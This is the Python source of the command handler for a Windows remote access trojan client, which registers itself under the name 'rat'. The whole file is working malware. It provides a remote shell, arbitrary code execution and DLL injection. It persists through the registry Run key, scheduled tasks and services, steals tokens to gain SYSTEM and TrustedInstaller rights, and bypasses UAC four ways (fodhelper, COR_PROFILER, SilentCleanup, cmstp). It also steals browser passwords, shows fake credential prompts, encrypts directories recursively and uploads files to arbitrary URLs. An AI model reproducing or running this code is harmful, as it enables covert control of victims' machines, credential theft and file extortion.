import contextlib
import inspect
import io
import json
import os
import shlex
import shutil
import subprocess
import time
from functools import wraps
from pathlib import Path

from common.util import logger, get_time, format_dict, parse, parse_args, parse_kwargs

if os.name == 'nt':
    from client.win32util import *

    INTEGRITY_LEVEL = get_integrity_level()
    EXECUTABLE_PATH = get_executable_path()
    LP_APPLICATION_NAME, LP_COMMAND_LINE = get_executable_info()

UP_TIME = get_time()


def desc(text):
    def attr_decorator(func):
        setattr(func, 'help', text)
        return func

    return attr_decorator


def params(arg_list):
    def attr_decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            arg_dict = parse_args(arg_list, shlex.split(args[0]))
            for key in arg_dict:
                setattr(func, key, arg_dict[key])
            return func(func, *args, **kwargs)

        wrapper.__signature__ = inspect.signature(func)
        return wrapper

    return attr_decorator


def params_kwargs(arg_list):
    def attr_decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            arg_dict = parse_kwargs(arg_list, shlex.split(args[0]))
            for key in arg_dict:
                setattr(func, key, arg_dict[key])
            return func(func, *args, **kwargs)

        wrapper.__signature__ = inspect.signature(func)
        return wrapper

    return attr_decorator


def enclosing(func):
    def wrapper(*args):
        nested_funcs = {k: v for k, v in func(*args).items() if callable(v)}
        arg_str = args[0]
        if not arg_str:
            return 1, format_dict({k: v.help for k, v in nested_funcs.items() if hasattr(v, 'help')}, index=True)
        cmd_name, cmd_arg = parse(arg_str)
        nested_func = None
        try:
            index = int(cmd_name)
            nested_func = list(nested_funcs.items())[index][1]
        except (ValueError, IndexError):
            if cmd_name in nested_funcs:
                nested_func = nested_funcs[cmd_name]
        finally:
            if not nested_func:
                return 0, f'No such function: {cmd_name}'
            if len(inspect.getfullargspec(nested_func).args):
                return nested_func(cmd_arg)
            else:
                return nested_func()

    wrapper.__signature__ = inspect.signature(func)
    return wrapper


def require_admin(func):
    def wrapper(*args):
        if ctypes.windll.shell32.IsUserAnAdmin():
            return func(*args)
        else:
            return 0, 'Administrator rights required'

    wrapper.__signature__ = inspect.signature(func)
    return wrapper


def require_integrity(integrity_level):
    def attr_decorator(func):
        @wraps(func)
        def wrapper(*args):
            if integrity_level == INTEGRITY_LEVEL:
                return func(*args)
            else:
                return 0, f'{integrity_level} integrity level required'

        wrapper.__signature__ = inspect.signature(func)
        return wrapper

    return attr_decorator


def get_command_list():
    return json.dumps([cmd for cmd in vars(Command) if hasattr(getattr(Command, cmd), 'help')])


class Command:

    @staticmethod
    @desc('close connection')
    def kill(_instance):
        _, conn = _instance
        conn.close()
        sys.exit(0)

    @staticmethod
    @desc('reset connection')
    def reset(_instance):
        subprocess.Popen(EXECUTABLE_PATH)
        _instance[1].close()
        sys.exit(0)

    @staticmethod
    @desc('show this help')
    def help():
        return 1, format_dict(
            {k: getattr(Command, k).help for k, v in vars(Command).items() if hasattr(getattr(Command, k), 'help')})

    @staticmethod
    @desc('change directory')
    def cd(path):
        if not path:
            return 1, ''
        if os.path.isdir(path):
            os.chdir(path)
            return 1, ''
        else:
            return 0, 'Cannot find the path specified'

    @staticmethod
    @desc('execute shell command')
    def shell(command):
        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.DEVNULL)
        stdout = str(cmd.stdout.read(), locale.getdefaultlocale()[1])
        stderr = str(cmd.stderr.read(), locale.getdefaultlocale()[1])
        if stdout:
            return 1, stdout
        elif stderr:
            return 0, stderr
        else:
            return 1, ''

    @staticmethod
    def run(command):
        if not command:
            return 0, ''
        p = subprocess.Popen(command, creationflags=subprocess.CREATE_NEW_CONSOLE)
        return 1, 'Process created: {}'.format(p.pid)

    @staticmethod
    @desc('download file')
    def download(filename, _instance):
        if os.path.isfile(filename):
            id, conn = _instance
            conn.send_file(id, filename)
        else:
            return 0, 'File does not exist'

    @staticmethod
    @desc('inject DLL into process')
    @params(['pid', 'dll_path'])
    def inject(this, args):
        if not os.path.isfile(this.dll_path):
            return 0, 'File does not exist: {}'.format(this.dll_path)
        return create_remote_thread(int(this.pid), os.path.abspath(this.dll_path))

    @staticmethod
    @desc('execute python code')
    def pyexec(code, kwargs=None):
        if kwargs is None:
            kwargs = {}
        f = io.StringIO()
        with contextlib.redirect_stdout(f), contextlib.redirect_stderr(f):
            exec(code, kwargs)
        return 1, f.getvalue()

    @staticmethod
    @desc('grab a screenshot')
    def screenshot(_instance):
        import pyautogui
        filename = 'screenshot_{}.png'.format(get_time())
        pyautogui.screenshot(filename)
        id, conn = _instance
        conn.send_file(id, filename)
        os.remove(filename)

    @staticmethod
    @desc('get information')
    def getinfo():
        import platform
        info = {}
        try:
            info['pid'] = os.getpid()
            info['hostname'] = platform.node()
            info['os'] = platform.platform()
            info['username'] = psutil.Process().username()
            info['integrity'] = INTEGRITY_LEVEL
            info['exec_path'] = EXECUTABLE_PATH
            info['up_time'] = UP_TIME
        except Exception as e:
            logger.error(e)
        finally:
            return 1, format_dict(info)

    @staticmethod
    @desc('detect user inactive time')
    def idletime():
        import win32api
        return 1, 'User has been idle for: {} seconds'.format(
            (win32api.GetTickCount() - win32api.GetLastInputInfo()) / 1000.0)

    @staticmethod
    @desc('perform emergency shutdown')
    def poweroff():
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.ZwShutdownSystem(2)

    @staticmethod
    @desc('apply persistence mechanism')
    @enclosing
    def persist(args):

        @desc('create registry key')
        def registry(option):
            import winreg
            if not option:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0,
                                     winreg.KEY_WRITE)
                winreg.SetValueEx(key, 'rat', 0, winreg.REG_SZ, EXECUTABLE_PATH)
                winreg.CloseKey(key)
                return 1, 'registry key created'
            elif option == '--undo':
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0,
                                     winreg.KEY_WRITE)
                winreg.DeleteValue(key, 'rat')
                winreg.CloseKey(key)
                return 1, 'registry key removed'
            else:
                return 0, 'unknown option: {}'.format(option)

        @desc('schedule task')
        @require_admin
        def schtasks(option):
            if not option:
                return Command.shell(
                    f'schtasks.exe /create /tn rat /sc onlogon /ru system /rl highest /tr "{EXECUTABLE_PATH}" /f')
            elif option == '--undo':
                return Command.shell('schtasks.exe /delete /tn rat /f')
            else:
                return 0, 'unknown option: {}'.format(option)

        @desc('create service')
        @require_admin
        def service(option):
            if not option:
                return Command.shell(f'sc create rat binpath="{EXECUTABLE_PATH}" start= auto')
            elif option == '--undo':
                return Command.shell('sc delete rat')
            else:
                return 0, 'unknown option: {}'.format(option)

        return locals()

    @staticmethod
    @desc('duplicate token from process')
    @enclosing
    def stealtoken(args):
        @desc('run as system')
        @require_admin
        def system():
            enable_privilege('SeDebugPrivilege')
            pid = create_process_with_token(duplicate_token(get_process_token(get_pid('winlogon.exe'))),
                                            LP_APPLICATION_NAME, LP_COMMAND_LINE)
            return 1, 'Process created: {}'.format(pid)

        @desc('run as trusted installer')
        @require_integrity('System')
        def ti():
            enable_privilege('SeDebugPrivilege')
            start_service('TrustedInstaller')
            h_token = duplicate_token(get_process_token(get_pid('TrustedInstaller.exe')))
            pid = create_process_with_token(h_token, LP_APPLICATION_NAME, LP_COMMAND_LINE)
            return 1, 'Process created: {}'.format(pid)

        @desc('bypass session 0 isolation and run as user')
        @require_integrity('System')
        def user():
            enable_privilege('SeTcbPrivilege')
            h_token = duplicate_token(get_user_token())
            pid = create_process_as_user(h_token, LP_APPLICATION_NAME, LP_COMMAND_LINE)
            return 1, 'Process created: {}'.format(pid)

        @desc('bypass session 0 isolation and run as admin')
        @require_integrity('System')
        def admin():
            enable_privilege('SeTcbPrivilege')
            h_token = duplicate_token(get_linked_token(get_user_token()))
            pid = create_process_as_user(h_token, LP_APPLICATION_NAME, LP_COMMAND_LINE)
            return 1, 'Process created: {}'.format(pid)

        return locals()

    @staticmethod
    @desc('elevate as admin without uac prompt')
    @enclosing
    def uac(args):
        @desc('ask for elevation')
        @require_integrity('Medium')
        def ask():
            import win32api
            result = ctypes.windll.shell32.ShellExecuteW(None, 'runas', LP_APPLICATION_NAME, LP_COMMAND_LINE, None, 1)
            if result > 32:
                return 1, ''
            else:
                return 0, str(result) + ', ' + win32api.FormatMessage(result)

        @desc('trusted binary')
        @require_integrity('Medium')
        def fodhelper():
            import winreg
            reg_path = r'Software\Classes\ms-settings\shell\open\command'
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, None, 0, winreg.REG_SZ, EXECUTABLE_PATH)
            winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')
            p = subprocess.Popen(r'C:\Windows\System32\fodhelper.exe', shell=True)
            p.communicate()
            winreg.SetValueEx(key, None, 0, winreg.REG_SZ, '')
            winreg.DeleteValue(key, 'DelegateExecute')
            winreg.CloseKey(key)
            return 1, 'success'

        @desc('.net profiler dll')
        @require_integrity('Medium')
        def clr():
            import winreg
            dll_path = os.path.abspath(rf'external\{Path(EXECUTABLE_PATH).stem}.dll')
            if not os.path.isfile(dll_path):
                return 0, f'File does not exist: {dll_path}'
            reg_path = r'Software\Classes\CLSID\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\InprocServer32'
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, None, 0, winreg.REG_EXPAND_SZ, dll_path)
            winreg.CloseKey(key)
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Environment', 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, 'COR_PROFILER', 0, winreg.REG_SZ, '{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}')
            winreg.SetValueEx(key, 'COR_PROFILER_PATH', 0, winreg.REG_SZ, dll_path)
            winreg.SetValueEx(key, 'COR_ENABLE_PROFILING', 0, winreg.REG_SZ, '1')
            p = subprocess.Popen('mmc eventvwr.msc', shell=True)
            p.communicate()
            winreg.DeleteValue(key, 'COR_PROFILER')
            winreg.DeleteValue(key, 'COR_PROFILER_PATH')
            winreg.DeleteValue(key, 'COR_ENABLE_PROFILING')
            winreg.CloseKey(key)
            return 1, 'success'

        @desc('disk cleanup scheduled task')
        @require_integrity('Medium')
        def diskcleanup():
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Environment', 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, 'windir', 0, winreg.REG_SZ, EXECUTABLE_PATH + ' ;')
            p = subprocess.Popen(r'schtasks.exe /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /i', shell=True)
            p.communicate()
            winreg.DeleteValue(key, 'windir')
            winreg.CloseKey(key)
            return 1, 'success'

        @desc('install inf file')
        @require_integrity('Medium')
        def cmstp():
            import tempfile
            inf_template = r'''
[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
[RunPreSetupCommandsSection]
{}
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7
[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
[Strings]
ServiceName="flcVPN"
ShortSvcName="flcVPN"
            '''.format(EXECUTABLE_PATH)
            inf_path = os.path.join(tempfile.gettempdir(), 'tmp.inf')
            with open(inf_path, 'w') as f:
                f.write(inf_template)
            p = subprocess.Popen(r'C:\Windows\System32\cmstp.exe "{}" /au'.format(inf_path))
            time.sleep(1)
            hwnd = ctypes.windll.user32.FindWindowW(None, 'flcVPN')
            if not hwnd:
                raise Exception('unable to detect window')
            if not ctypes.windll.user32.SetForegroundWindow(hwnd):
                raise Exception('unable to activate window')
            if not ctypes.windll.user32.keybd_event(0x0D, 0, 0, 0):
                raise Exception('unable to send keyboard event to window')
            time.sleep(5)
            psutil.Process(p.pid).kill()
            os.remove(inf_path)
            return 1, 'success'

        return locals()

    @staticmethod
    @desc('extract data from browser')
    @params(['browser', 'type'])
    def browser(this, args):
        home = os.path.expanduser('~')
        profile_paths = {
            'chrome': os.path.join(home, r'AppData\Local\Google\Chrome\User Data'),
            'edge': os.path.join(home, r'AppData\Local\Microsoft\Edge\User Data'),
        }
        profile_path = profile_paths.get(this.browser)
        if not profile_path:
            return 0, 'Not supported: {}'.format(this.browser)
        if not os.path.isdir(profile_path):
            return 0, 'Not installed: {}'.format(this.browser)
        local_state = os.path.join(profile_path, 'Local State')
        default = os.path.join(profile_path, r'Default')
        login_data = os.path.join(default, 'Login Data')
        bookmarks = os.path.join(default, 'Bookmarks')
        history = os.path.join(default, 'History')
        if this.type == 'password':
            return 1, json.dumps(get_chromium_passwords(get_master_key(local_state), login_data),
                                 sort_keys=False,
                                 indent=2,
                                 ensure_ascii=False)
        elif this.type == 'bookmark':
            return 1, json.dumps(get_chromium_bookmarks(bookmarks), indent=2, ensure_ascii=False)
        elif this.type == 'history':
            return 1, json.dumps(get_chromium_history(history), sort_keys=False, indent=2, ensure_ascii=False)
        else:
            return 0, 'Error: {}'.format(this.type)

    @staticmethod
    @desc('prompt for credentials')
    @enclosing
    def cred(args):

        @desc('PSHostUserInterface.PromptForCredential')
        def pshostui(option):
            command = r'$cred=$Host.UI.PromptForCredential($null,$null,$env:username,$null);' \
                      'if($cred) {echo $cred.GetNetworkCredential().UserName $cred.GetNetworkCredential().Password} ' \
                      'else {echo `n} '
            if option == '--create-desktop':
                try:
                    create_desktop()
                    while 1:
                        status, result = create_process(r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe',
                                                        f' {command}')
                        if not status:
                            raise Exception(result)
                        lines = result.splitlines()
                        if logon_user(*lines):
                            switch_default()
                            return 1, str(lines)
                except:
                    switch_default()
                    raise
            else:
                while True:
                    p = subprocess.Popen(f'powershell.exe {command}', stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                         shell=True)
                    stdout, stderr = p.communicate()
                    if stderr:
                        return 0, stderr.decode(locale.getdefaultlocale()[1])
                    lines = stdout.decode(locale.getdefaultlocale()[1]).splitlines()
                    if logon_user(*lines):
                        return 1, str(lines)

        @desc('Windows.Security.Credentials.UI.CredentialPicker')
        def credpicker():
            filename = os.path.abspath(r'external\Cred.ps1')
            if not os.path.isfile(filename):
                return 0, f'File does not exist: {filename}'
            p = subprocess.Popen(rf'powershell.exe -ep bypass -file "{filename}"', stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE, shell=True)
            stdout, stderr = p.communicate()
            if stderr:
                return 0, stderr.decode(locale.getdefaultlocale()[1])
            lines = stdout.decode(locale.getdefaultlocale()[1]).splitlines()
            return 1, str(lines)

        return locals()

    @staticmethod
    @desc('encrypt and decrypt files')
    @enclosing
    def aes(args):

        @desc('key generation')
        def gen():
            import base64
            from Crypto.Random import get_random_bytes
            return 1, base64.b64encode(get_random_bytes(32)).decode()

        @params(['key', 'path'])
        @desc('encryption')
        def enc(this, arg):
            import base64
            key = base64.b64decode(this.key)
            if os.path.isfile(this.path):
                encrypt_file(this.path, key)
                return 1, 'success'
            elif os.path.isdir(this.path):
                result = []
                for root, subdirs, files in os.walk(this.path):
                    for filename in files:
                        try:
                            encrypt_file(os.path.join(root, filename), key)
                        except Exception as e:
                            result.append(str(e))
                return 1, '\n'.join(result)
            else:
                return 0, 'No such file or directory'

        @params(['key', 'path'])
        @desc('decryption')
        def dec(this, arg):
            import base64
            key = base64.b64decode(this.key)
            if os.path.isfile(this.path):
                decrypt_file(this.path, key)
                return 1, 'success'
            elif os.path.isdir(this.path):
                result = []
                for root, subdirs, files in os.walk(this.path):
                    for filename in files:
                        try:
                            decrypt_file(os.path.join(root, filename), key)
                        except Exception as e:
                            result.append(str(e))
                return 1, '\n'.join(result)
            else:
                return 0, 'No such file or directory'

        return locals()

    @staticmethod
    @desc('create a zip archive')
    def zip(dir_name):
        import pathlib, shutil
        dir_name = os.path.abspath(dir_name)
        if not os.path.isdir(dir_name):
            return 0, f'Directory does not exist: {dir_name}'
        zip_name = os.path.basename(dir_name)
        pardir = pathlib.Path(dir_name).resolve().parent
        if dir_name == os.getcwd():
            zip_name = os.path.join('..', zip_name)
        filename = shutil.make_archive(zip_name, format='zip', root_dir=pardir, base_dir=os.path.basename(dir_name))
        return 1, f'Archive created: {filename}'

    @staticmethod
    @desc('extract files from a zip archive')
    def unzip(zip_name):
        import shutil
        zip_name = os.path.abspath(zip_name)
        if not os.path.isfile(zip_name):
            return 0, f'File does not exist: {zip_name}'
        shutil.unpack_archive(zip_name, os.getcwd())
        return 1, f'Archive extracted to {os.getcwd()}'

    @staticmethod
    @params_kwargs([
        [['url'], {'type': str, 'nargs': '*'}],
        [['-o'], {'type': str, 'nargs': '*', 'required': False}],
    ])
    def web_download(this, args):
        if not this.url:
            return 0, 'No URL provided'
        import requests
        with requests.get(this.url, stream=True) as resp:
            if resp.status_code == 200:
                local_filename = os.path.abspath(this.o if this.o else os.path.basename(this.url))
                with open(local_filename, 'wb') as f:
                    shutil.copyfileobj(resp.raw, f)
                return 1, f'File downloaded: {local_filename}'
            else:
                return 0, str(resp.status_code)

    @staticmethod
    @params_kwargs([
        [['url'], {'type': str, 'nargs': '*'}],
        [['--file', '-f'], {'type': str, 'nargs': '*', 'required': True}],
        [['--form_data_key', '-k'], {'type': str, 'nargs': '*', 'required': False, 'default': 'file'}],
        [['--cookies', '-c'], {'type': str, 'nargs': '*', 'required': False}]
    ])
    def web_upload(this, args):
        if not this.url:
            return 0, 'No URL provided'
        import requests
        filename = os.path.abspath(this.file)
        if not os.path.isfile(filename):
            return 0, f'File does not exist: {filename}'
        with open(filename, 'rb') as f:
            with requests.post(this.url, files={this.form_data_key: f},
                               cookies=json.loads(this.cookies) if this.cookies else None) as resp:
                return 1, resp.text
